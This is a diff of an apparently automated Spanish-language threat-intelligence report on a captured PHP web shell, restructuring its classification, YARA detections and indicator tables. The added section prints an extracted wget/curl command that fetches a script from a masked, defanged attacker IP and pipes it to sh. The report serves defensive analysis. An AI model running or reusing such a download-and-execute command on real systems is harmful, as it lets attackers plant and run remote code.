@@ -4,60 +4,71 @@
 
 ## 📌 Resumen
 
-Web shell registrado por Oráculo SOC. 24 coincidencias YARA.
+Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registró 1 detección YARA válida. Se asoció 1 comando observado o extraído.
 
 ## 🏷️ Clasificación
 
 - **Categoría:** `Web shell`
 - **Familia:** `webshell`
-- **Confianza:** `0.9`
+- **Confianza de familia:** `Alta`
+- **Riesgo:** `Critical`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T18:39:48+00:00`
-- **Modo:** `automatic_snapshot`
+- **Registrado:** `2026-08-09T18:39:48.000000Z`
+- **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
 
 - **SHA256:** `749451b9de3c9c40c39812a9c830dbdf9e649c056613104ae262717dcb81738a`
+- **MD5:** `cea26aeb6e3d5b2fc9125fcee2afe334`
 
-## 🧪 Análisis del artefacto
+## 🧪 Análisis estático
 
 | Propiedad | Resultado |
 | --- | --- |
-| Tipo | payload |
-| Tamaño | 4095 |
+| Descripción | ASCII text, with very long lines (338), with CRLF line terminators |
+| Tamaño | 4.0 KiB |
 | Entropía | 5.84 |
+| Strings | 76 |
 
-## 🧬 Detecciones
+## 🧠 Comportamiento observado
 
-- YARA: `Suspicious_PHP_Webshell`
-- YARA: `0x43c:$php1:`
-- YARA: `0x643:$php1:`
-- YARA: `0x448:$exec1:`
-- YARA: `0x64f:$exec1:`
-- YARA: `0x442:$shell1:`
-- YARA: `0x649:$shell1:`
-- YARA: `0x44d:$base64d:`
-- YARA: `0x654:$base64d:`
-- YARA: `__YARA_SENTINEL_NO_MATCH__`
-- YARA: `0x857:$php1:`
-- YARA: `0xa6c:$php1:`
-- YARA: `0xc7b:$php1:`
-- YARA: `0xe5b:$php1:`
-- YARA: `0xf63:$php1:`
-- YARA: `0x863:$exec1:`
-- YARA: `0xa78:$exec1:`
-- YARA: `0xc87:$exec1:`
-- YARA: `0x85d:$shell1:`
-- YARA: `0xa72:$shell1:`
-- YARA: `0xc81:$shell1:`
-- YARA: `0x868:$base64d:`
-- YARA: `0xa7d:$base64d:`
-- YARA: `0xc8c:$base64d:`
+1. **Descarga remota**
+2. **Ejecución**
+
+## 🔬 Evidencia de clasificación
+
+- YARA match: webshell
+
+## 🖥️ Comandos observados / extraídos
+
+```text
+(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
+```
+
+## 🌐 Indicadores
+
+| Tipo | Valor | Contexto |
+| --- | --- | --- |
+| ip | 190.179.177.XXX | static_analysis |
+| ip | 217.60.195.XXX | static_analysis |
+| url | hxxps://217.60.195.XXX/sh | strings |
+| url | hxxps://217.60.195.XXX/sh) | strings |
+| hash | 749451b9de3c9c40c39812a9c830dbdf9e649c056613104ae262717dcb81738a | static_analysis |
+| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
+| ip | 223.85.97.XXX | artifact_source |
+
+## 🧬 Detecciones YARA
+
+| Regla | Familia | Severidad | Confianza |
+| --- | --- | --- | --- |
+| Suspicious_PHP_Webshell |  | medium | medium |
+
+Detalle completo: [`detections.md`](detections.md).
 
 ## 🛡️ Nota de publicación
 
-Este informe es una **fotografía inmutable del momento de registro**. No se publican marcas temporales de observación ni contadores que requieran actualización posterior.
+Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.
 
-Las direcciones IPv4 públicas se publican con el último octeto como `XXX`; las direcciones internas y material sensible se redactan antes de salir de Oráculo SOC.
+Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
